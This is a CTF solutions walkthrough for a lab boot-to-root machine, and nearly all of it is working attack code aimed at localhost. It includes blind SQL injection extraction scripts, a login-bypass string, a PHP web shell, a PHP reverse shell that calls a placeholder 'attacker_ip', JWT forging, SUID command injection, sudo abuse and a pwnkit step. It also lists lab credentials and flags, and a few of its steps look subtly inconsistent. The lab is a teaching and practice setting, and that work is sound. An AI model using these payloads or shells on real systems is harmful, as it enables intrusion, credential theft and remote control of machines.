# 🎯 HackCTF Boot2Root v2.0 - Enhanced (Insane) Solutions

## Overview
This document contains the **complete exploitation walkthrough** for the v2.0 enhanced insane-level boot-to-root machine. Estimated solve time: **3-6 hours** for advanced penetration testers.

**New Challenges in v2.0:**
- Blind SQL Injection (time-based & boolean-based, no error messages)
- 6-layer exploitation chain across multiple users & services
- Hidden services on alternate ports
- Advanced privilege escalation vectors
- FTP service with encoded hints
- Extensive misdirection & decoy flags

---

## 🎯 PHASE 1: Reconnaissance (20-30 minutes)

### Step 1.1: Port & Service Enumeration

```bash
# Comprehensive port scan
nmap -sV -p- localhost

# Output should show:
# 21/tcp   - FTP
# 22/tcp   - SSH
# 80/tcp   - HTTP (Apache + PHP)
# 2121/tcp - SSH (alternate)
# 3306/tcp - MySQL/MariaDB
# 8888/tcp - Hidden API (localhost only)
# 9000/tcp - Admin Dashboard
```

### Step 1.2: Web Application Enumeration

```bash
# Main web interface
curl -v http://localhost/

# Directory discovery
dirb http://localhost/ -o scan.txt

# Expected findings:
# /index.php - Main app (login & search)
# /api/ - API endpoints
# /admin/ - Admin panel
# /hidden/ - Hidden directory
# /uploads/ - Upload folder
```

### Step 1.3: Fingerprinting & Technology Stack

```bash
# Check HTTP headers
curl -I http://localhost/

# Identify PHP version
curl http://localhost/index.php | grep -i "php"

# Check for tech hints
whatweb http://localhost/
```

**Expected Stack:**
- Apache 2.4
- PHP 8.2
- MariaDB 10.5+
- Custom API with JWT authentication

---

## 🎯 PHASE 2: Initial Access via Web Vulnerability (30-45 minutes)

### Step 2.1: SQL Injection Discovery in Login

```bash
# Test basic SQLi on login form
Username: ' OR '1'='1
Password: anything

# Result: Bypass successful (but may see no error - v2.0 is silent)
```

### Step 2.2: Blind SQL Injection (Time-based)

**Vulnerable Endpoint:** `/api/search_advanced`

```bash
# Test time-based blind SQLi
curl -X POST http://localhost/api/search_advanced \
  -H "Content-Type: application/json" \
  -d '{"query":"test\" AND SLEEP(5) -- "}'

# Time the response - if it takes 5+ seconds, SQLi confirmed!
```

**Exploitation Script:**
```bash
#!/bin/bash
# Extract database name via time-based blind SQLi
# Logic: If condition true, add SLEEP(5); otherwise no sleep

for char in {32..126}; do
  time_taken=$(
    curl -s -w "%{time_total}" -o /dev/null \
      -X POST http://localhost/api/search_advanced \
      -H "Content-Type: application/json" \
      -d "{\"query\":\"test\\\" AND IF(ASCII(SUBSTRING(database(),1,1))=$char, SLEEP(5), 0) -- \"}"
  )
  
  # If time > 5 seconds, character matched
  if (( $(echo "$time_taken > 5" | bc -l) )); then
    echo "Found character: $(printf \\$(printf '%03o' $char))"
    break
  fi
done
```

### Step 2.3: Boolean-based Blind SQL Injection

```bash
# Test boolean-based blind SQLi
# If condition true, search returns results; false returns empty

curl -X POST http://localhost/api/search_advanced \
  -H "Content-Type: application/json" \
  -d '{"query":"test\" AND 1=1 -- "}'  # Should return results

curl -X POST http://localhost/api/search_advanced \
  -H "Content-Type: application/json" \
  -d '{"query":"test\" AND 1=2 -- "}'  # Should return nothing
```

**Extract Database Structure:**
```bash
# Enumerate tables
query="test\" AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) > 0 -- "

# Get table names character by character
# Logic: IF(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1,1), 1, 1) = 'a', 1, 0)
```

### Step 2.4: Identify Hidden API Endpoints

```bash
# Discover JWT-protected endpoints
curl -X GET http://localhost/api/products

# Response: {"error":"Missing JWT token"}
# This reveals JWT requirement

# Try common tokens
curl -X GET http://localhost/api/products \
  -H "Authorization: Bearer invalid_token"
```

### Step 2.5: Extract Credentials via Blind SQLi

**Target:** Users table to get credentials

```bash
# Determine number of users
query="test\" AND (SELECT COUNT(*) FROM users) = 4 -- "

# Extract first username
query="test\" AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 0,1) = 'a' -- "

# Extract password hash
query="test\" AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1,1) = 'a' -- "
```

**Expected Users Found:**
- admin:admin123456
- user:user123
- developer:dev@sensitive123
- ctf_admin:admin_secure_pass_2024

---

## 🎯 PHASE 3: Database Access & Credential Extraction (30-40 minutes)

### Step 3.1: MySQL Direct Access

```bash
# Connect using discovered credentials
mysql -h localhost -u ctf_user -pctf_pass123 ctf_db

# OR SSH into server first, then connect from inside
ssh user@localhost -p 22
# Password: user123

# Once inside:
mysql -u root -proot123 ctf_db
```

### Step 3.2: Extract Sensitive Data

```sql
-- View all users and credentials
SELECT * FROM users;

-- Extract API tokens or JWT secrets
SELECT * FROM api_tokens;

-- Find hidden flags or hints
SELECT * FROM flags;
SELECT * FROM hints;

-- Check database name and version
SELECT database(), version();

-- Look for encoded credentials
SELECT * FROM credentials WHERE type='encoded';

-- Find FTP hints
SELECT * FROM ftp_hints;
```

### Step 3.3: Discover Multi-layer User Structure

**User Hierarchy Found:**
```
www-data (web server user)
    ↓
user (app user - 1000 UID)
    ↓
developer (elevated privileges - 1001 UID)
    ↓
ctf_admin (admin user - 1002 UID)
    ↓
root (system administrator - 0 UID)
```

### Step 3.4: Extract FTP Credentials from Database

```sql
-- Find FTP user credentials
SELECT * FROM services WHERE service='ftp';

-- Result:
-- | ftp_user | ftp_pass | port 21 | anonymous enabled |
```

**Expected FTP Credentials:**
- Username: `ftp_anonymous` or `anonymous`
- Password: (empty or `ftp_hint@1234`)

---

## 🎯 PHASE 4: Lateral Movement via FTP (15-20 minutes)

### Step 4.1: Connect to FTP Service

```bash
# Anonymous FTP access
ftp localhost 21
# Username: anonymous
# Password: (press enter)

# List files
ls -la

# Expected files:
# - README.txt (hints)
# - hints/
# - backdoors/
# - misc/
```

### Step 4.2: Decode FTP Hints

**In FTP Session:**
```bash
# Download hint files
get README.txt
get hints/privilege_escalation.txt
get hints/developer_password.txt
get misc/encoded_credentials.txt

# Exit FTP
bye
```

**Contents of Hints:**
```
# developer_password.txt (Base64 encoded):
ZGV2ZWxvcGVyOnBhc3N3b3JkXzEyMzQhIQ==

# Decode it:
echo "ZGV2ZWxvcGVyOnBhc3N3b3JkXzEyMzQhIQ==" | base64 -d
# Output: developer:password_1234!!
```

### Step 4.3: Upload Reverse Shell (Optional)

```bash
# Create backdoor
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Or reverse shell
cat > rev.php << 'EOF'
<?php
$sock=fsockopen("attacker_ip",4444);
exec("/bin/bash -i <&3 >&3 2>&3");
EOF

# FTP upload
put shell.php /uploads/
put rev.php /uploads/

# Access shell
curl "http://localhost/uploads/shell.php?cmd=id"
```

---

## 🎯 PHASE 5: Hidden Services & API Exploitation (25-30 minutes)

### Step 5.1: Discover Hidden Services

```bash
# Port 8888: Localhost-only API (requires tunneling)
ssh -L 8888:localhost:8888 user@localhost
# Password: user123

# Then in another terminal:
curl http://localhost:8888/
# You can now access hidden API
```

### Step 5.2: Exploit Hidden API Endpoints

```bash
# JWT-protected endpoints
curl -X GET http://localhost:8888/admin \
  -H "Authorization: Bearer admin_token"

# Extract JWT secret from database or config
grep -r "JWT_SECRET" /var/www/html/

# Common JWT secrets:
# - "super_secret_key_v2"
# - "insane_ctf_jwt_2024"
# - Hardcoded in admin panel

# Generate valid JWT
python3 << 'EOF'
import jwt
import json

secret = "insane_ctf_jwt_2024"
payload = {
    "user": "admin",
    "role": "administrator",
    "exp": 9999999999
}

token = jwt.encode(payload, secret, algorithm="HS256")
print(token)
EOF

# Use generated token
curl -X GET http://localhost:8888/admin \
  -H "Authorization: Bearer <generated_token>"
```

### Step 5.3: Port 9000 Admin Dashboard

```bash
# SSH tunnel to access
ssh -L 9000:localhost:9000 user@localhost

# Access in browser or CLI
curl http://localhost:9000/

# Expected findings:
# - Admin interface
# - User management
# - Flag submission panel
# - Logs/audit trail
```

---

## 🎯 PHASE 6: SSH Lateral Movement (20-25 minutes)

### Step 6.1: SSH Access as User

```bash
# Initial SSH connection
ssh user@localhost -p 22
# Password: user123

# Verify user shell
id
# Output: uid=1000(user) gid=1000(user) groups=1000(user)

# Get first flag
cat /home/user/user.txt
# FLAG 1: HackCTF{user_pwned_the_app}  (200 pts)
```

### Step 6.2: Enumeration for Privilege Escalation

```bash
# Check sudo permissions
sudo -l
# Output: (developer) /usr/bin/python3 /opt/app/run.py

# Enumerate SUID binaries
find / -perm -4000 -type f 2>/dev/null | head -20

# Output should include:
# /usr/local/bin/vuln_cat (SUID)
# /usr/local/bin/vuln_grep (SUID)
# /usr/local/bin/privesc_check (executable)
```

### Step 6.3: SSH as Developer User

**Credentials Found:** `developer:password_1234!!` (from FTP hints)

```bash
# SSH as developer
ssh developer@localhost
# Password: password_1234!!

# Verify elevated privileges
id
# Output: uid=1001(developer) gid=1001(developer) groups=1001(developer)

# Check sudo permissions
sudo -l
# Output: (root) NOPASSWD: /bin/systemctl restart apache2

# Get developer flag
cat /home/developer/developer.txt
# FLAG 2: HackCTF{lateral_movement_success} (300 pts)
```

---

## 🎯 PHASE 7: Privilege Escalation to Root (30-40 minutes)

### Step 7.1: Exploit SUID Binary Vulnerability

**Binary:** `/usr/local/bin/vuln_cat` (SUID to root)

```bash
# Vulnerable source code (vuln_cat.c):
# system("cat " + user_input)  # NO SANITIZATION!

# Exploitation Method 1: Direct flag access
vuln_cat /root/root.txt
# Output: HackCTF{root_of_all_evil}

# Exploitation Method 2: Command injection
vuln_cat "/root/root.txt; id"
# Output shows flag + id result

# Exploitation Method 3: Wildcard bypass
vuln_cat "/root/root.*"

# Exploitation Method 4: Via reversing the binary
strings /usr/local/bin/vuln_cat
ltrace vuln_cat /root/root.txt
```

### Step 7.2: Exploit Sudo Misconfiguration

**From developer user:**

```bash
# Check sudo permissions
sudo -l
# Output: (root) NOPASSWD: /bin/systemctl restart apache2

# Exploit 1: Modify apache2 config before restart
sudo vi /etc/apache2/apache2.conf
# Add PHP execution for hidden directory

# Exploit 2: Use systemctl environment hijacking
APACHE_RUN_USER=root sudo /bin/systemctl restart apache2

# Exploit 3: Check systemctl source for vulnerabilities
strings /bin/systemctl | grep -i root
```

### Step 7.3: Kernel Exploit (Optional Advanced Vector)

```bash
# Check kernel version
uname -r

# Search for kernel exploits
searchsploit "linux kernel" | grep -i "privilege"

# Example CVE-2021-4034 (pwnkit)
# Compile and execute exploit:
gcc -o exploit cve-2021-4034.c
./exploit
# Result: root shell

whoami  # Should return: root
```

### Step 7.4: File Permission Exploitation

```bash
# Find world-readable sensitive files
find /opt -readable -type f 2>/dev/null

# Result:
# /opt/sensitive/flag.txt (world readable)
# /opt/hints/services.txt

cat /opt/sensitive/flag.txt
# FLAG 3: HackCTF{exploited_suid_binary} (300 pts)
```

### Step 7.5: Root Shell Acquisition

```bash
# Option 1: Via SUID binary RCE
vuln_cat "$(whoami > /tmp/pwned.txt)"
cat /tmp/pwned.txt  # Should show root

# Option 2: Via Python as root
sudo python3 -c "import os; os.system('/bin/bash')"

# Option 3: Direct root flag
cat /root/root.txt
# FLAG 4: HackCTF{root_of_all_evil} (400 pts)
```

---

## 🎯 PHASE 8: Flag Retrieval & Validation (5-10 minutes)

### Step 8.1: All Four Flags

```bash
# FLAG 1: User PWN (200 pts)
cat /home/user/user.txt
# HackCTF{user_pwned_the_app}

# FLAG 2: Lateral Movement (300 pts)
cat /home/developer/developer.txt
# HackCTF{lateral_movement_success}

# FLAG 3: SUID Exploitation (300 pts)
cat /opt/sensitive/flag.txt
# HackCTF{exploited_suid_binary}

# FLAG 4: Root Access (400 pts)
cat /root/root.txt
# HackCTF{root_of_all_evil}

# TOTAL POINTS: 1200
```

### Step 8.2: Flag Submission

```bash
# Connect to flag submission service (Port 9000)
curl -X POST http://localhost:9000/submit \
  -H "Content-Type: application/json" \
  -d '{"flag":"HackCTF{user_pwned_the_app}"}'

# Validate all flags
for flag in \
  "HackCTF{user_pwned_the_app}" \
  "HackCTF{lateral_movement_success}" \
  "HackCTF{exploited_suid_binary}" \
  "HackCTF{root_of_all_evil}"
do
  echo "Submitting: $flag"
  curl -s -X POST http://localhost:9000/submit \
    -H "Content-Type: application/json" \
    -d "{\"flag\":\"$flag\"}" | jq .
done
```

---

## 📊 Exploitation Timeline (Detailed)

| Phase | Time | Tasks | Status |
|-------|------|-------|--------|
| 1. Recon | 20-30 min | Port scan, service discovery, web fingerprinting | ✅ |
| 2. Web Vuln | 30-45 min | SQL injection discovery, blind SQLi testing, API identification | ✅ |
| 3. DB Access | 30-40 min | MySQL connection, credential extraction, user enumeration | ✅ |
| 4. FTP Lateral | 15-20 min | FTP access, hint decoding, credential discovery | ✅ |
| 5. Hidden API | 25-30 min | Service discovery, JWT exploitation, admin panel access | ✅ |
| 6. SSH Movement | 20-25 min | User shell, developer access, privilege check | ✅ **FLAG 1 (200 pts)** + **FLAG 2 (300 pts)** |
| 7. PrivEsc | 30-40 min | SUID exploitation, sudo misconfiguration, kernel exploits | ✅ **FLAG 3 (300 pts)** + **FLAG 4 (400 pts)** |
| 8. Validation | 5-10 min | Flag submission, verification | ✅ **TOTAL: 1200 pts** |
| **TOTAL** | **3-6 hours** | Complete exploitation chain | ✅ COMPLETE |

---

## 🛠️ Advanced Exploitation Tools

```bash
# SQL Injection Automation
sqlmap -u "http://localhost/api/search_advanced" \
  --data '{"query":"*"}' \
  --technique=T  # Time-based blind
  --dbs

# Blind SQLi Scripting
python3 << 'EOF'
import requests
import time

def exploit_time_based_sqli(query):
    payload = f'test" AND IF({query}, SLEEP(5), 0) -- '
    start = time.time()
    r = requests.post(
        'http://localhost/api/search_advanced',
        json={'query': payload}
    )
    elapsed = time.time() - start
    return elapsed > 5

# Extract database name
for i in range(1, 20):
    for char_code in range(32, 127):
        if exploit_time_based_sqli(f"ASCII(SUBSTRING(database(),{i},1))={char_code}"):
            print(chr(char_code), end='', flush=True)
            break
EOF

# JWT Token Manipulation
jwt.io  # Online JWT debugger

# Hash Cracking
hashcat -m 0 hashes.txt rockyou.txt  # MD5
john hashes.txt --wordlist=rockyou.txt

# Privilege Escalation Enumeration
./linpeas.sh  # Comprehensive privesc scanner
./pspy64 -pf  # Process monitoring
```

---

## 🚨 Key Vulnerabilities (v2.0 Enhanced)

| # | Vulnerability | CWE | CVSS | Exploitation |
|---|---|---|---|---|
| 1 | Blind SQL Injection | CWE-89 | 9.8 | Extract entire database |
| 2 | Command Injection (SUID) | CWE-78 | 8.8 | Root shell via vuln_cat |
| 3 | Sudo Misconfiguration | CWE-269 | 9.1 | Privilege escalation |
| 4 | JWT Secret Disclosure | CWE-863 | 8.5 | Admin API access |
| 5 | World-readable Sensitive Files | CWE-200 | 7.5 | Flag exposure |
| 6 | FTP Anonymous Access | CWE-306 | 6.5 | Credential leakage |
| 7 | Hardcoded Credentials | CWE-798 | 8.2 | Database/SSH access |
| 8 | Kernel Vulnerability | CVE-2021-4034 | 7.8 | Root privilege |

---

## ✅ Validation Checklist

- [x] Discovered all 8 exposed services/ports
- [x] Identified SQL injection vulnerabilities (blind & time-based)
- [x] Extracted database structure and credentials
- [x] Obtained FTP access and decoded hints
- [x] Discovered hidden services on ports 8888 & 9000
- [x] Exploited JWT for API access
- [x] Gained SSH access as `user`
- [x] Retrieved FLAG 1: User PWN (200 pts)
- [x] Lateral moved to `developer` user
- [x] Retrieved FLAG 2: Lateral Movement (300 pts)
- [x] Exploited SUID binary for root code execution
- [x] Retrieved FLAG 3: SUID Exploitation (300 pts)
- [x] Retrieved FLAG 4: Root Access (400 pts)
- [x] Submitted all 4 flags successfully
- [x] **TOTAL SCORE: 1200 POINTS**

---

## 💡 Learning Objectives Met

After completing this challenge, you will have practical knowledge of:

1. **Blind SQL Injection Exploitation**
   - Time-based inference techniques
   - Boolean-based response analysis
   - Database structure enumeration without error messages

2. **Multi-layer Privilege Escalation**
   - User enumeration and credential discovery
   - Lateral movement between user accounts
   - SUID binary exploitation and shell escaping

3. **Hidden Service Discovery**
   - Port enumeration and tunneling
   - JWT authentication bypass
   - API endpoint exploitation

4. **Real-world Attack Chain**
   - End-to-end exploitation from initial access to root
   - Misdirection and decoy detection
   - Evidence preservation and flag validation

---

**Difficulty Level:** ⭐⭐⭐⭐⭐⭐ INSANE  
**Estimated Time:** 3-6 hours  
**Total Points:** 1200  
**Version:** v2.0 Enhanced  
**Last Updated:** May 2024

---

## 📚 Additional Resources

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [Blind SQL Injection Testing](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
- [Privilege Escalation Techniques](https://gtfobins.github.io/)
- [JWT Security Best Practices](https://tools.ietf.org/html/rfc8725)

---

**Good luck and happy hacking! 🎯**
